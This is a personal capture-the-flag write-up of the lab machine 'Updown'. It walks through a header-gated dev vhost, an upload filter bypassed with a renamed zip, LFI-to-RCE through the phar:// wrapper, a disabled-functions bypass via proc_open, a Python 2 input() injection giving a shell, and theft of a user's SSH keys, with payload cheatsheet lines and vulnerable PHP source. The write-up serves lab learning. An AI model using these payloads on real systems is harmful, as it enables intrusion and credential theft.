# Updown \[Medium]

## Report

An exposed git directory gives us access to source code. A file upload functionality at a dev virtual host which is only accessible by adding a specific header as mentioned in the .htaccess file is used to perform LFI2RCE as we control an 'include' parameter on the index page of the website calling our uploaded file using PHAR filter. phpinfo reveals a list of disabled functions, so we call a reverse shell using `proc_open`

FInd a legacy python script that accepts input, use it to spawn a new shell and read SSH keys of user 'developer'. This user can run a binary via sudo and GTFObins does the rest.

Our wordlist for ffuf does not look for git which is insane, modify that please, also recursively scan subdirectories too from now on, just because it showed 301, we thought there was no scope there.

## Cheatsheet

```
Special-Dev: only4dev [In HTTP header to visit dev vhost]
<?php phpinfo(); ?>
zip info.0xdf info.php
python2 dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/[MD5]/info.0xdf/info
import('os').system('bash')
```

## Loot

### Creds

`md5sum authorized_keys id_rsa.pub` \[SSH Public key for developer]

### Proof

{% code title=".htaccess" %}
```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
{% endcode %}

If the Required-Header 'Special-Dev' is present with value 'only4dev' we access the dev vhost

{% code title="index.php" %}
```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```
{% endcode %}

php file extension is appended to any value passed here as long as standard LFI directories are not mentioned

#### checker.php

```php
if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
```

Next it checks against a denylist of file extensions:

```php
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
```

Then it creates a directory from the hash of the current time in the `uploads` directory, and moves the file into that:

```php
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
```

It then does some stuff with the file, reading it, and checking websites. I’m going to ignore that bit for now. But I will note that at the end, it does delete the file (`unlink`):

```php
  # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));

        foreach($websites as $site){
                echo date("Y.m.d") . "<br>";
                $site=trim($site);
                echo "testing " . $site . ".<br>";
                if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                        $check=isitup($site);
                        if($check){
                                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                        }else{
                                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                        }
                }else{
                        echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
                }
        }

  # Delete the uploaded file.
        @unlink($final_path);
        echo "file is deleted?";
}
```

Our play here is to upload a file here and access it via the 'page' parameter in 'index.php'

Normal files are deleted via unlink method so our poison byte play wouldn't work&#x20;

Uploads directory listing enabled so we can see where our files are being stored (we can't fetch the exact timestamp here as it's not present in response headers, bruteforce it at that point if needed)

I thought to upload a php file bypassing the file extension filter and use a revshell in a line since they split file based on newlines.

```php
$check=isitup($site);
```

This function also isn't defined anywhere so we really can't reverse engineer this process.

Break the logic such that it doesn't get to the delete part, use non ASCII characters

That's when you zip it (or any archive really)

SInce they are just filtering based on file extension names we can rename ours to something random and it will pass eg. 0xdf

Reading the read upload file function, we see they are blocking PHP filters for file, data and ftp within our file, zip is checked at file upload itself

{% code title="info.php" %}
```
<?php phpinfo(); ?>
```
{% endcode %}

`zip info.0xdf info.php`

Visiting file at [`http://dev.siteisup.htb/?page=phar://uploads/[MD5]/info.0xdf/info`](http://dev.siteisup.htb/?page=phar://uploads/828afc50efeaa61d10099d92a4f618c5/info.0xdf/info)

We get the info page and see a lot of disabled functions, we can't just call a standard web shell like we always do

A legacy python tool dfunc-bypasser automates this for us as long as we feed it the phpinfo page

`python2 dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/[MD5]/info.0xdf/info`

proc\_open not disabled, google a shell using that

As www-data, find a python script and binary running with SUID in user 'developer' home

```python
www-data@updown:/home/developer/dev$ python2 siteisup_test.py 
Enter URL here:http://10.10.14.6/test
Traceback (most recent call last):
  File "siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    http://10.10.14.6/test
        ^
SyntaxError: invalid syntax
```

The binary performs the same action, calling the python script to perform lookup

**`import`**`('os').system('id')`

**`import`**`('os').system('bash')`

We are only user 'developer' since the process ran under it, but group remains same and we can't access the user flag yet.

We can access the SSH keys and copy the private key to our system. Ensure the public key is in authorized\_keys on target system. Don't forget to chmod your private key.

### Enumeration

```
80
siteisup.htb
VHOST dev : 403 (Forbidden)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Tried to access dev vhost via input param didnt work
Tried port fuzzing also didnt work

HTTP/1.1 301 Moved Permanently
Date: Sat, 02 Aug 2025 03:16:41 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://127.0.0.1/dev/
Content-Length: 304
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Sat, 02 Aug 2025 03:16:41 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

HOW TO ACCESS THE DEV VHOST FROM HERE

access to git repo from dev subdir
htaccess file show rules to access vhost
add header Special-Dev: only4dev

 $websites = explode("\n",file_get_contents($final_path));
 our rev shell must be in one line
```
